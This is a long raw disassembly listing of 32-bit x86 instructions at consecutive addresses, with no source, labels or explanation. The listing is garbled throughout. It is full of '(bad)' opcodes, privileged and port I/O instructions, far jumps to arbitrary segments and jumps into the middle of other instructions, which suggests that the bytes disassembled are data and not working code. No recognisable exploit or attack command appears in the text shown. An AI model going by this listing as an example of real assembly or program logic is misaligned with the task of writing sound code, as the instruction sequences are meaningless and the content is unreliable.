  413032:	fisub  DWORD PTR [ecx]
  413034:	call   0xdd22:0xf661edc2
  41303b:	xor    bh,BYTE PTR [ecx+0x5e89c00]
  413041:	mul    ah
  413043:	jno    0x412fca
  413045:	inc    esp
  413046:	jmp    0x54cabf58
  41304b:	pop    edx
  41304c:	ins    DWORD PTR es:[edi],dx
  41304d:	pop    ds
  41304e:	sar    ecx,0x8b
  413051:	(bad)  
  413052:	call   0xb549cc
  413057:	add    edx,edx
  413059:	xor    DWORD PTR [eax],edx
  41305b:	xchg   ecx,eax
  41305c:	cdq    
  41305d:	add    BYTE PTR [ebp-0x45],dh
  413060:	or     eax,0xc8401471
  413065:	adc    BYTE PTR [ebx-0x171a6a00],cl
  41306b:	popf   
  41306c:	out    0xe,al
  41306e:	sti    
  41306f:	jmp    0x41302c
  413071:	or     eax,0xa8e41471
  413076:	adc    BYTE PTR [esi-0x1c],dl
  413079:	test   al,0x8
  41307b:	dec    DWORD PTR [esi-0x74bfee7c]
  413081:	scas   al,BYTE PTR es:[edi]
  413082:	pop    ecx
  413083:	ret    0xdcbb
  413086:	push   ecx
  413087:	mov    esi,DWORD PTR [edi]
  413089:	daa    
  41308a:	add    DWORD PTR [eax],esi
  41308c:	xchg   edi,eax
  41308d:	mov    eax,0x61bd0400
  413092:	jno    0x4130a0
  413094:	(bad)  
  413095:	mov    ebx,0xdbcfd3e8
  41309a:	add    BYTE PTR [ebx+edi*1+0x5e3b1889],al
  4130a1:	in     al,dx
  4130a2:	inc    sp
  4130a4:	dec    ebx
  4130a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130a6:	adc    bh,bh
  4130a8:	out    dx,al
  4130a9:	pop    es
  4130aa:	mov    BYTE PTR [ebp+0x4b],dl
  4130ad:	popa   
  4130ae:	dec    ecx
  4130af:	or     BYTE PTR [ebx-0x3a],ah
  4130b2:	stc    
  4130b3:	jmp    DWORD PTR [edx+eax*1+0x10]
  4130b7:	jmp    FWORD PTR [esi+0xb75fc08]
  4130bd:	(bad)  
  4130be:	sti    
  4130bf:	jne    0x4130c4
  4130c1:	or     eax,0x9c2e1411
  4130c6:	add    BYTE PTR [esi-0x5a],bl
  4130c9:	sbb    edx,DWORD PTR [eax]
  4130cb:	add    BYTE PTR [eax],al
  4130cd:	dec    esi
  4130ce:	(bad)  
  4130cf:	in     al,dx
  4130d0:	mul    BYTE PTR [edx+0x5]
  4130d3:	adc    DWORD PTR [esi+ebx*4+0x2],ebp
  4130d7:	std    
  4130d8:	push   ebp
  4130d9:	fnstenv [eax+ecx*1-0x79f5bc8c]
  4130e0:	push   esp
  4130e1:	arpl   WORD PTR [edx],ax
  4130e3:	jge    0x4130a5
  4130e5:	dec    esi
  4130e6:	or     bl,BYTE PTR [eax]
  4130e8:	xor    esi,DWORD PTR [edx-0x34]
  4130eb:	inc    eax
  4130ec:	add    BYTE PTR [edi-0xe],cl
  4130ef:	shl    DWORD PTR [ebx+0x56],cl
  4130f2:	jnp    0x413122
  4130f4:	adc    cl,ch
  4130f6:	aam    0xc
  4130f8:	call   0xfe158e50
  4130fd:	mov    ecx,0x7673d411
  413102:	outs   dx,DWORD PTR ds:[esi]
  413103:	dec    esi
  413104:	adc    BYTE PTR [edi+eax*4],ch
  413107:	dec    esi
  413108:	or     BYTE PTR [ebp+0x2214c4f4],cl
  41310e:	add    dh,BYTE PTR [ebx]
  413110:	pop    ebx
  413111:	mov    al,ds:0xe95300f1
  413116:	mov    ch,0xcb
  413118:	add    esi,DWORD PTR [edx]
  41311a:	push   cs
  41311b:	cmp    eax,0x88505e00
  413120:	jae    0x413190
  413122:	xor    al,0x22
  413124:	call   0x437dc6
  413129:	out    0xc0,al
  41312b:	dec    ebp
  41312c:	sbb    BYTE PTR [ecx+0x69f10d],cl
  413132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413133:	add    BYTE PTR [esi+0x10],cl
  413136:	xor    eax,0x9788ed4e
  41313b:	adc    BYTE PTR [eax-0x3737a5b5],cl
  413141:	cld    
  413142:	sbb    eax,0x1510e4f0
  413147:	outs   dx,BYTE PTR ds:[esi]
  413148:	in     eax,dx
  413149:	cld    
  41314a:	xchg   edi,eax
  41314b:	fincstp 
  41314d:	cmp    DWORD PTR [edi],eax
  41314f:	ins    DWORD PTR es:[edi],dx
  413150:	out    dx,eax
  413151:	rcl    BYTE PTR [ecx-0x43],cl
  413154:	cld    
  413155:	inc    ebx
  413156:	bound  edx,QWORD PTR [edi-0x26ad39d4]
  41315c:	sbb    al,0x7f
  41315e:	imul   bh
  413160:	jecxz  0x413175
  413162:	dec    esi
  413163:	popf   
  413164:	out    0x7,eax
  413166:	sub    al,0x62
  413168:	xor    al,0xf4
  41316a:	push   ecx
  41316b:	mov    eax,0xd82e058f
  413170:	out    0x87,eax
  413172:	mov    ds:0x710eef6d,al
  413177:	leave  
  413178:	add    DWORD PTR [eax+0x62],ecx
  41317b:	ins    BYTE PTR es:[edi],dx
  41317c:	xlat   BYTE PTR ds:[ebx]
  41317d:	shl    BYTE PTR [ecx],cl
  41317f:	shl    DWORD PTR [edx+0x39],1
  413182:	jbe    0x4131e6
  413184:	and    al,0xfc
  413186:	jge    0x4131e4
  413188:	imul   edx,ebx,0xffffff8f
  41318b:	add    bh,dl
  41318d:	rcl    BYTE PTR [ecx],cl
  41318f:	rcr    DWORD PTR [esi+0x59],1
  413192:	push   esi
  413193:	(bad)  
  413194:	push   esi
  413195:	pop    ecx
  413196:	add    BYTE PTR [esi-0xa],ah
  413199:	sar    ebx,cl
  41319b:	outs   dx,BYTE PTR ds:[esi]
  41319c:	int3   
  41319d:	sar    eax,cl
  41319f:	and    eax,0x20309dd9
  4131a4:	int    0xe7
  4131a6:	cmp    bl,ch
  4131a8:	add    al,0x35
  4131aa:	or     DWORD PTR [edx+0x5e03ab85],edx
  4131b0:	(bad)  
  4131b1:	jb     0x41320c
  4131b3:	push   edx
  4131b4:	ins    DWORD PTR es:[edi],dx
  4131b5:	enter  0xfadb,0x89
  4131b9:	call   0x7b5a17c1
  4131be:	jmp    0x41322a
  4131c0:	lods   al,BYTE PTR ds:[esi]
  4131c1:	xlat   BYTE PTR ds:[ebx]
  4131c2:	pop    ebp
  4131c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131c4:	fld    DWORD PTR [eax]
  4131c6:	jl     0x4131d9
  4131c8:	cmc    
  4131c9:	jb     0x41319c
  4131cb:	mov    WORD PTR [edx-0x1e5d8dec],cs
  4131d1:	call   0xfd3543f3
  4131d6:	ret    0xf4ec
  4131d9:	jb     0x4131cc
  4131db:	adc    BYTE PTR [edx+0x14],ch
  4131de:	pop    ds
  4131df:	adc    DWORD PTR [edx+0xc],ebp
  4131e2:	mov    esi,0xdcfde13a
  4131e7:	adc    ebp,ecx
  4131e9:	inc    eax
  4131ea:	jmp    0xfe03c482
  4131ef:	popa   
  4131f0:	mov    cl,BYTE PTR [ecx+0x30d99b8d]
  4131f6:	add    eax,0x3704d92a
  4131fb:	add    BYTE PTR ds:0x7efd0c6a,ch
  413201:	add    DWORD PTR [ebp+0x1a],ebp
  413204:	fld    DWORD PTR [si+0x2da9]
  413209:	sar    DWORD PTR [ecx],1
  41320b:	mov    ah,0x91
  41320d:	jg     0x413253
  41320f:	jmp    0xd53efb3e
  413214:	jne    0x413276
  413216:	push   ebx
  413217:	stc    
  413218:	hlt    
  413219:	mov    eax,ds:0xef944108
  41321e:	cld    
  41321f:	inc    esi
  413220:	test   al,cl
  413222:	std    
  413223:	mov    ah,0x55
  413225:	div    BYTE PTR [edx-0x27]
  413228:	fwait
  413229:	div    BYTE PTR [edx-0x1f]
  41322c:	xor    cl,cl
  41322e:	sbb    ah,bh
  413230:	mov    eax,ds:0x27bc5ed9
  413235:	retf   0xbc00
  413238:	mov    ah,0x5
  41323a:	mul    ah
  41323c:	push   ecx
  41323d:	test   DWORD PTR [eax+eax*1+0x3b],eax
  413241:	fst    QWORD PTR [esi-0x75]
  413244:	xchg   esi,eax
  413245:	hlt    
  413246:	jo     0x413269
  413248:	arpl   bp,dx
  41324a:	dec    edi
  41324b:	add    ebx,edi
  41324d:	pop    esp
  41324e:	shl    BYTE PTR [ebx+eiz*2-0x1a],0x31
  413253:	adc    BYTE PTR [ecx-0x48aff5f],dl
  413259:	or     DWORD PTR [ecx+0x14],esi
  41325c:	sub    BYTE PTR [eax+edx*1-0xad1ff75],0xe4
  413264:	lods   eax,DWORD PTR ds:[esi]
  413265:	mov    al,ds:0xbbebfb0a
  41326a:	or     DWORD PTR [ecx+0x14],esi
  41326d:	cld    
  41326e:	mov    WORD PTR [eax],ss
  413270:	push   esi
  413271:	cld    
  413272:	mov    WORD PTR [eax],cs
  413274:	push   DWORD PTR [esi-0x34bfee2c]
  41327a:	stos   BYTE PTR es:[edi],al
  41327b:	pop    ecx
  41327c:	ret    0xd8ab
  41327f:	push   ecx
  413280:	mov    ecx,edi
  413282:	lmsw   WORD PTR [eax]
  413285:	outs   dx,DWORD PTR ds:[esi]
  413286:	mov    eax,ds:0x76750400
  41328b:	jno    0x41329d
  41328d:	xchg   edi,eax
  41328e:	mov    bh,0xe8
  413290:	jecxz  0x41325b
  413292:	xlat   BYTE PTR ds:[ebx]
  413293:	add    BYTE PTR [ebx+ecx*2+0x563b1891],al
  41329a:	in     eax,dx
  41329b:	inc    sp
  41329d:	jnp    0x41322a
  41329f:	adc    bh,bh
  4132a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132a2:	add    BYTE PTR [eax+0x49753755],cl
  4132a8:	or     al,0xa3
  4132aa:	xor    bh,0xff
  4132ad:	jl     0x4132c5
  4132af:	ud0    esp,esi
  4132b2:	(bad)  
  4132b3:	sti    
  4132b4:	jne    0x4132ed
  4132b6:	mov    dl,0xfb
  4132b8:	jne    0x41331c
  4132ba:	dec    bh
  4132bc:	jae    0x413318
  4132be:	jecxz  0x4132b5
  4132c0:	arpl   WORD PTR [edi+0x42],cx
  4132c3:	add    DWORD PTR [esi+0x0],ebx
  4132c6:	mov    edi,0xaefff8c0
  4132cb:	ja     0x4132ad
  4132cd:	mul    BYTE PTR [edi+0x32]
  4132d0:	pop    ebp
  4132d1:	inc    esp
  4132d2:	bound  eax,QWORD PTR [esi]
  4132d4:	aaa    
  4132d5:	mov    DWORD PTR [edi-0xe],esi
  4132d8:	push   esp
  4132d9:	pop    ds
  4132da:	or     ch,BYTE PTR [eax+0x33]
  4132dd:	(bad)  
  4132de:	in     eax,dx
  4132df:	jge    0x4132a2
  4132e1:	je     0x41332d
  4132e3:	xlat   BYTE PTR ds:[ebx]
  4132e4:	adc    eax,0x4be4810
  4132e9:	jae    0x41335d
  4132eb:	sub    edx,DWORD PTR [esi+0x18]
  4132ee:	fxch   st(4)
  4132f0:	clc    
  4132f1:	mov    BYTE PTR [edi],dl
  4132f3:	out    dx,al
  4132f4:	fcomp  DWORD PTR [esi]
  4132f6:	mov    ecx,0x51e9d052
  4132fb:	dec    ebx
  4132fc:	push   esi
  4132fd:	sbb    BYTE PTR [ebp-0x5aaa0734],ch
  413303:	hlt    
  413304:	cld    
  413305:	cld    
  413306:	pop    ss
  413307:	jmp    0x41:0x152213cf
  41330e:	sub    al,0xe5
  413310:	(bad)  
  413311:	adc    al,0x62
  413313:	mov    bh,0xfd
  413315:	addr16 push edi
  413317:	inc    edx
  413318:	add    DWORD PTR [ebx+0x5c],esi
  41331b:	dec    edx
  41331c:	icebp  
  41331d:	sbb    al,0x23
  41331f:	add    al,ah
  413321:	cmp    DWORD PTR [edi+0x16],edx
  413324:	idiv   BYTE PTR [edi]
  413326:	bound  ebp,QWORD PTR ds:0xac00b807
  41332c:	or     eax,DWORD PTR [edx+0x0]
  41332f:	and    eax,ebp
  413331:	std    
  413332:	pop    ss
  413333:	outs   dx,DWORD PTR ds:[esi]
  413334:	fldenv [edi+0x5fdbb103]
  41333a:	lea    eax,[edx+0x73c4e798]
  413340:	sbb    edx,edx
  413342:	(bad)  
  413343:	jns    0x413311
  413345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413346:	add    ebx,eax
  413348:	fxch   st(0)
  41334a:	inc    edx
  41334b:	(bad)  
  41334d:	stos   DWORD PTR es:[edi],eax
  41334e:	lds    esp,FWORD PTR [ebx]
  413350:	lea    esp,[edx-0x21]
  413353:	jecxz  0x41335a
  413355:	(bad)  
  413357:	popa   
  413358:	test   eax,0xdd62484b
  41335d:	cmp    eax,0x53e1717b
  413362:	push   ds
  413363:	cli    
  413364:	(bad)  
  413365:	sbb    DWORD PTR ds:0x58a75d62,eax
  41336b:	sbb    DWORD PTR [ebp+edi*4+0x58],0x81d5e6d
  413373:	mov    edx,0xbfcfa654
  413378:	pop    esp
  413379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41337a:	pop    eax
  41337b:	push   ecx
  41337c:	jg     0x41333d
  41337e:	xor    eax,0x35afa4d9
  413383:	mov    edx,0x62058d06
  413388:	pusha  
  413389:	and    al,0xb0
  41338b:	jmp    0x75c32c
  413390:	jnp    0x41336a
  413392:	adc    eax,0xfcad71cf
  413397:	inc    ebx
  413398:	bound  edx,QWORD PTR [ebx-0x26a13dd0]
  41339e:	mov    esp,0x3b567e7a
  4133a3:	sbb    al,0x6c
  4133a5:	fdivr  st(7),st
  4133a7:	pop    edi
  4133a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133a9:	(bad)  
  4133ab:	xor    eax,0xe1006beb
  4133b0:	mov    ch,0xc3
  4133b2:	call   0xfd33c2de
  4133b7:	ins    DWORD PTR es:[edi],dx
  4133b8:	es ins DWORD PTR es:[edi],dx
  4133ba:	and    esp,DWORD PTR [esp+ecx*1+0x6d]
  4133be:	pop    ds
  4133bf:	bound  ebp,QWORD PTR [ebp+ebx*8-0x18]
  4133c3:	mov    ecx,0x6cfcf414
  4133c8:	es ins DWORD PTR es:[edi],dx
  4133ca:	adc    edx,DWORD PTR [ebx-0x5b747487]
  4133d0:	mov    ecx,0xfc67e8a1
  4133d5:	icebp  
  4133d6:	cld    
  4133d7:	jo     0x413383
  4133d9:	adc    eax,0x88c6248b
  4133de:	jmp    0x13356bcb
  4133e3:	push   ebp
  4133e4:	jmp    0x413397
  4133e6:	add    BYTE PTR [edi],ah
  4133e8:	pop    ds
  4133e9:	pop    ss
  4133ea:	add    al,0xe9
  4133ec:	call   0xf6a8:0xad6aec60
  4133f3:	in     al,0x0
  4133f5:	jno    0x41337c
  4133f7:	inc    esp
  4133f8:	jmp    0x14cabf62
  4133fd:	mov    dh,0x65
  4133ff:	xor    DWORD PTR [ecx-0x17005de2],eax
  413405:	fstp   QWORD PTR [eax]
  413407:	je     0x4133dc
  413409:	jmp    0x30b2:0xe0c773ea
  413410:	cld    
  413411:	inc    esi
  413412:	pusha  
  413413:	dec    esi
  413414:	loope  0x4133bf
  413416:	repnz std 
  413418:	data16 lods al,BYTE PTR ds:[esi]
  41341a:	push   ebp
  41341b:	rcl    ch,0x7a
  41341e:	jg     0x413450
  413420:	mov    edi,0xb8d09de2
  413425:	mov    DWORD PTR [esi+eiz*8-0x7a22b600],ebp
  41342c:	inc    ebp
  41342d:	sbb    DWORD PTR [ecx+0x41],0xffffffd0
  413431:	jmp    0x413446
  413433:	std    
  413434:	push   ebp
  413435:	je     0x413428
  413437:	hlt    
  413438:	adc    al,0xb
  41343a:	fstp   QWORD PTR [esi-0x37]
  41343d:	mov    eax,ebx
  41343f:	add    BYTE PTR [ebp-0x40],dl
  413442:	adc    BYTE PTR [edi-0x14],bh
  413445:	or     eax,DWORD PTR [edi]
  413447:	add    DWORD PTR [eax],esi
  413449:	neg    DWORD PTR [eax+0x73ed0400]
  41344f:	jno    0x413459
  413451:	(bad)  
  413452:	retf   
  413453:	call   0x1171e7f
  413458:	test   BYTE PTR [eax],al
  41345a:	retf   
  41345b:	xchg   ecx,eax
  41345c:	sub    al,BYTE PTR [ebp-0x7cd96df3]
  413462:	push   ebp
  413463:	lds    esi,FWORD PTR [ecx+0x21]
  413466:	sub    BYTE PTR [edi+0x1ff7e808],0xfb
  41346d:	(bad)  
  41346e:	ds adc eax,0xc5211574
  413474:	push   esi
  413475:	lea    esp,[esi+0x25]
  413478:	dec    ebp
  413479:	call   0x3e2d67
  41347e:	xor    bl,BYTE PTR [eax+0x257e8dd8]
  413484:	push   eax
  413485:	jmp    0x413441
  413487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413488:	sti    
  413489:	adc    eax,0x3ce887
  41348e:	jne    0x4134c4
  413490:	ret    0x7b04
  413493:	stos   DWORD PTR es:[edi],eax
  413494:	dec    edi
  413495:	push   ebp
  413496:	ins    DWORD PTR es:[edi],dx
  413497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413498:	das    
  413499:	fstp   TBYTE PTR [eax-0x74ff7f6c]
  41349f:	fsubr  QWORD PTR [edx+0x2]
  4134a2:	bound  esi,QWORD PTR [ebx]
  4134a4:	push   edi
  4134a5:	(bad)  
  4134a6:	fmul   DWORD PTR [ecx+0x262005c]
  4134ac:	inc    ecx
  4134ad:	push   ebp
  4134ae:	jmp    0x4655003e
  4134b3:	adc    al,0x41
  4134b5:	add    cl,bl
  4134b7:	mov    cl,0x7f
  4134b9:	(bad)  
  4134ba:	cmp    eax,0x83164e
  4134bf:	inc    edi
  4134c0:	inc    esi
  4134c1:	in     eax,dx
  4134c2:	mov    ds,WORD PTR ss:[esi]
  4134c5:	jmp    0x7e74813d
  4134ca:	inc    esp
  4134cb:	inc    esi
  4134cc:	push   cs
  4134cd:	xor    ebp,edi
  4134cf:	mov    ss,WORD PTR [esi]
  4134d1:	and    DWORD PTR [ebx-0x4c],edx
  4134d4:	out    0xf5,eax
  4134d6:	xlat   BYTE PTR ds:[ebx]
  4134d7:	jo     0x41351b
  4134d9:	add    DWORD PTR [ebx-0x4efd71de],eax
  4134df:	arpl   WORD PTR [eax-0xc35ec35],bp
  4134e5:	inc    eax
  4134e6:	add    dl,ah
  4134e8:	or     al,BYTE PTR [edx]
  4134ea:	je     0x413551
  4134ec:	imul   edi,DWORD PTR [eax+ebp*8+0x2dcbe],0x2d
  4134f4:	enter  0x8a2d,0xa1
  4134f8:	retf   0xc229
  4134fb:	data16 add dh,BYTE PTR [esi]
  4134fe:	mov    esi,eax
  413500:	sbb    ch,0xc
  413503:	adc    al,0xaf
  413505:	paddw  mm1,QWORD PTR ds:0x35015aa7
  41350c:	int3   
  41350d:	add    DWORD PTR [eax+0x62],ebp
  413510:	add    al,BYTE PTR [ecx]
  413512:	xor    BYTE PTR [ebx],0x7b
  413515:	iret   
  413516:	std    
  413517:	outs   dx,DWORD PTR ds:[esi]
  413518:	push   esi
  413519:	out    dx,eax
  41351a:	aas    
  41351b:	(bad)  
  41351c:	fnstenv [eax+0x45]
  41351f:	push   0x5c
  413521:	pop    edi
  413522:	int3   
  413523:	add    dh,dh
  413525:	push   0x896e3e64
  41352a:	mov    bh,0xcc
  41352c:	jno    0x41352f
  41352e:	fld    DWORD PTR [ebx+0x62]
  413531:	push   esp
  413532:	daa    
  413533:	push   edi
  413534:	stos   BYTE PTR es:[edi],al
  413535:	mov    al,0xb4
  413537:	retf   
  413538:	ror    DWORD PTR [edx+0x61364662],1
  41353e:	lods   eax,DWORD PTR ds:[esi]
  41353f:	pop    es
  413540:	loope  0x41355b
  413542:	xchg   esp,eax
  413543:	pop    es
  413544:	in     eax,0xaf
  413546:	add    dl,BYTE PTR [eax]
  413548:	mov    eax,0x52037fd5
  41354d:	(bad)  
  41354f:	xor    ebp,DWORD PTR [edi+0x70dfd3ee]
  413555:	cdq    
  413556:	out    0x7a,eax
  413558:	pop    esp
  413559:	push   esp
  41355a:	daa    
  41355b:	push   edi
  41355c:	xor    al,BYTE PTR [esi-0x7709c68c]
  413562:	ficom  WORD PTR [edx+0x66]
  413565:	mov    esi,edx
  413567:	push   edx
  413568:	pop    edx
  413569:	out    dx,al
  41356a:	repz jecxz 0x4135dd
  41356d:	cdq    
  41356e:	out    0x80,eax
  413570:	mov    ds:0x197eeb65,al
  413575:	in     eax,dx
  413576:	icebp  
  413577:	cmp    DWORD PTR [esi+0x64],ebx
  41357a:	jecxz  0x41350f
  41357c:	mov    ebp,0x625c0003
  413581:	pop    ecx
  413582:	out    0x3,eax
  413584:	pop    ss
  413585:	out    dx,al
  413586:	fmul   st(2),st
  413588:	add    BYTE PTR [ecx+0x5],dl
  41358b:	stc    
  41358c:	inc    ebx
  41358d:	(bad)  
  41358e:	out    dx,al
  41358f:	cld    
  413590:	sti    
  413591:	xchg   esi,eax
  413592:	les    ebx,FWORD PTR [edi-0xa]
  413595:	dec    ebp
  413596:	fld    DWORD PTR [eax]
  413598:	mov    ebx,0xa05e8ca1
  41359d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41359e:	aad    0x0
  4135a0:	mov    edi,0x1f80fdf4
  4135a5:	gs or  ax,0x61c1
  4135aa:	pop    ecx
  4135ab:	add    cl,ch
  4135ad:	mov    edi,0x28fffdd9
  4135b2:	retf   0xdbd4
  4135b5:	mov    eax,ds:0x49b781d9
  4135ba:	out    dx,al
  4135bb:	jo     0x41359d
  4135bd:	sub    BYTE PTR [edi+0x8],ah
  4135c0:	xor    eax,DWORD PTR es:[esi+0x12]
  4135c4:	test   eax,0xbcc18f61
  4135c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135ca:	std    
  4135cb:	jle    0x4135ca
  4135cd:	adc    edx,ebx
  4135cf:	add    cl,ch
  4135d1:	call   0x55ec:0x1902f05a
  4135d8:	sahf   
  4135d9:	push   ecx
  4135da:	xor    esi,0x89d961e9
  4135e0:	jecxz  0x41360a
  4135e2:	retf   0xfb74
  4135e5:	mov    eax,ds:0x131448d9
  4135ea:	fld    DWORD PTR [eax]
  4135ec:	jmp    0x31c065f1
  4135f1:	mov    edi,0x79e10190
  4135f6:	popa   
  4135f7:	fst    DWORD PTR [eax+0x41]
  4135fa:	push   edx
  4135fb:	push   edx
  4135fc:	inc    eax
  4135fd:	jmp    0x29dc831b
  413602:	pop    esi
  413603:	bound  eax,QWORD PTR [ebx-0x314655f]
  413609:	add    DWORD PTR [edx-0x12],esp
  41360c:	cld    
  41360d:	jmp    0x1293763
  413612:	pushf  
  413613:	rol    DWORD PTR [eax],cl
  413615:	add    edi,0x1
  413618:	cmp    al,0xc
  41361b:	sahf   
  41361c:	inc    edx
  41361d:	mov    ebx,DWORD PTR [esi-0x13]
  413620:	mov    DWORD PTR [ebp-0x4defd],eax
  413626:	stos   DWORD PTR es:[edi],eax
  413627:	jo     0x4135ba
  413629:	lock adc BYTE PTR [ebx],ah
  41362c:	sti    
  41362d:	call   0x3c8dd8
  413632:	(bad)  
  413633:	sbb    BYTE PTR [eax+eiz*1+0x31],dh
  413637:	fldcw  WORD PTR [eax-0x80]
  41363a:	cmp    ebx,ecx
  41363c:	add    BYTE PTR [edx+0x4a],ch
  41363f:	pop    DWORD PTR [eax]
  413641:	push   0x4a
  413643:	xchg   ecx,eax
  413644:	add    BYTE PTR [eax],al
  413646:	cmp    ebx,DWORD PTR [ecx]
  413648:	sti    
  413649:	jne    0x41368e
  41364b:	and    BYTE PTR [ecx],dl
  41364d:	in     al,0x19
  41364f:	cdq    
  413650:	add    BYTE PTR [ebx+0x711f6300],al
  413656:	adc    ebp,eax
  413658:	push   ebp
  413659:	dec    al
  41365b:	sti    
  41365c:	fadd   DWORD PTR [eax]
  41365e:	jb     0x4135f7
  413660:	mov    al,0x5f
  413663:	popf   
  413664:	xor    dl,al
  413666:	add    al,0xfb
  413668:	test   al,0xfb
  41366a:	adc    eax,0x3ce373
  41366f:	sti    
  413670:	fsub   st,st(7)
  413672:	out    dx,eax
  413673:	jbe    0x4136e3
  413675:	in     al,dx
  413676:	sbb    DWORD PTR [edi-0x44ffff1b],0xf0f08163
  413680:	and    bh,bl
  413682:	push   esi
  413683:	je     0x41362a
  413685:	push   0xd8bbf6
  41368a:	mov    esp,DWORD PTR [edx+0x48]
  41368d:	(bad)  
  41368e:	adc    edx,DWORD PTR [esi]
  413690:	lock inc eax
  413692:	add    BYTE PTR [edx],ch
  413694:	adc    eax,0x26200ce
  413699:	push   eax
  41369a:	push   esi
  41369b:	push   ecx
  41369c:	ins    BYTE PTR es:[edi],dx
  41369d:	fdivr  QWORD PTR [edx+esi*4]
  4136a0:	add    al,BYTE PTR [ecx]
  4136a2:	push   eax
  4136a3:	or     ch,BYTE PTR [esi+0x65]
  4136a6:	inc    eax
  4136a7:	bound  ecx,QWORD PTR [edx]
  4136a9:	xchg   ecx,eax
  4136aa:	fwait
  4136ab:	and    al,BYTE PTR [edx]
  4136ad:	jbe    0x413632
  4136af:	pop    edx
  4136b0:	popf   
  4136b1:	(bad)  
  4136b2:	std    
  4136b3:	retf   0x1fe
  4136b6:	add    BYTE PTR [eax],al
  4136b8:	bound  edx,QWORD PTR [edx-0x27]
  4136bb:	aas    
  4136bc:	test   DWORD PTR [eax],eax
  4136be:	add    DWORD PTR [ecx-0x77bf9da],eax
  4136c4:	xor    eax,0xe78b1c4e
  4136c9:	mov    ecx,0x3225fdc5
  4136ce:	jbe    0x413663
  4136d0:	adc    al,bh
  4136d2:	(bad)  
  4136d3:	std    
  4136d4:	jmp    0xe57f137b
  4136d9:	jmp    0x69f6:0x6e2283c7
  4136e0:	bound  eax,QWORD PTR [ebx-0x38]
  4136e3:	adc    edx,DWORD PTR [edx]
  4136e5:	lock inc eax
  4136e7:	add    bh,ah
  4136e9:	inc    ecx
  4136ea:	dec    esi
  4136eb:	or     al,0x9c
  4136ed:	jg     0x4136b6
  4136ef:	fs push eax
  4136f1:	outs   dx,BYTE PTR ds:[esi]
  4136f2:	adc    eax,eax
  4136f4:	xor    eax,0x12c1b9b4
  4136f9:	add    esp,ebx
  4136fb:	clc    
  4136fc:	xchg   ecx,eax
  4136fd:	inc    edx
  4136fe:	jle    0x4136c7
  413700:	ss loope 0x413735
  413703:	push   0xffffff84
  413705:	fld    DWORD PTR [ebp+0x62]
  413708:	jne    0x4136b4
  41370a:	adc    al,0xf1
  41370c:	push   esi
  41370d:	and    al,0x38
  41370f:	push   es
  413710:	add    al,0x56
  413712:	mov    ecx,0xc2736b4f
  413717:	mov    cl,0x11
  413719:	loop   0x413720
  41371b:	or     eax,DWORD PTR [eax]
  41371d:	inc    ebp
  41371e:	aad    0xfc
  413720:	add    al,0x33
  413722:	sbb    DWORD PTR [edi],esp
  413724:	sub    ah,BYTE PTR [ebx+0x1731bc87]
  41372a:	pusha  
  41372b:	pusha  
  41372c:	xor    BYTE PTR [ebx],dh
  41372e:	adc    BYTE PTR [esi-0x12],dl
  413731:	sbb    edi,eax
  413733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413734:	add    ebp,ebx
  413736:	jmp    0x95a108a6
  41373b:	ss clc 
  41373d:	push   cs
  41373e:	aam    0x6a
  413740:	retf   
  413741:	sahf   
  413742:	gs loope 0x4136c9
  413745:	cmp    bh,BYTE PTR [ebx+0x54c7fe9b]
  41374b:	daa    
  41374c:	dec    esi
  41374d:	jnp    0x4137ad
  41374f:	call   DWORD PTR [ebx]
  413751:	and    al,BYTE PTR [ebx-0x15a3857b]
  413757:	(bad)  [edi-0x7b186690]
  41375d:	or     ch,bl
  41375f:	jnp    0x413758
  413761:	xchg   edx,eax
  413762:	sub    dh,0xed
  413765:	and    eax,0xe10427c8
  41376a:	sbb    edx,edx
  41376c:	add    bh,BYTE PTR [edx+0x47f75bc9]
  413772:	push   esp
  413773:	mov    esp,0x70736a50
  413778:	push   ss
  413779:	jecxz  0x41378e
  41377b:	jmp    0x683c5a
  413780:	call   0x5bccbb85
  413785:	arpl   WORD PTR [ecx+0x293cc190],sp
  41378b:	std    
  41378c:	add    BYTE PTR [ebp+0x31ec6a96],0x62
  413793:	fld    DWORD PTR [eax]
  413795:	aaa    
  413796:	sbb    edx,edi
  413798:	push   esp
  413799:	adc    DWORD PTR [esi+0x8e9404e],esp
  41379f:	add    ecx,DWORD PTR [ebx-0x1722bddb]
  4137a5:	hlt    
  4137a6:	imul   ebx
  4137a8:	cld    
  4137a9:	ins    BYTE PTR es:[edi],dx
  4137aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137ab:	gs jo  0x41381a
  4137ae:	loop   0x413765
  4137b0:	adc    bl,ch
  4137b2:	popa   
  4137b3:	fst    DWORD PTR [eax+0x5c]
  4137b6:	mov    ds:0x24990cb5,al
  4137bb:	(bad)  
  4137bc:	int3   
  4137bd:	(bad)  [ecx-0x1ece7627]
  4137c3:	jmp    0x4137c1
  4137c5:	mov    ch,0x87
  4137c7:	pop    esi
  4137c8:	mov    ebp,cs
  4137ca:	xlat   BYTE PTR gs:[ebx]
  4137cc:	add    cl,ch
  4137ce:	or     DWORD PTR [esi+0x552516fd],edi
  4137d4:	rcl    BYTE PTR [ebp+ebp*2-0x776640a0],0x3
  4137dc:	mov    ebp,DWORD PTR [ebp-0x4f17229b]
  4137e2:	jg     0x4137d0
  4137e4:	cld    
  4137e5:	add    BYTE PTR fs:[esi],bl
  4137e8:	gs sbb bl,bh
  4137eb:	ins    DWORD PTR es:[edi],dx
  4137ec:	mov    ch,0x10
  4137ee:	jmp    0x413851
  4137f0:	fst    DWORD PTR [eax]
  4137f2:	fs xchg ebp,eax
  4137f4:	mov    ch,0x8
  4137f6:	push   ebp
  4137f7:	aad    0xf1
  4137f9:	mov    al,BYTE PTR [eax]
  4137fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137fc:	adc    bh,bl
  4137fe:	jmp    0x4137be
  413800:	or     eax,0xd5c92add
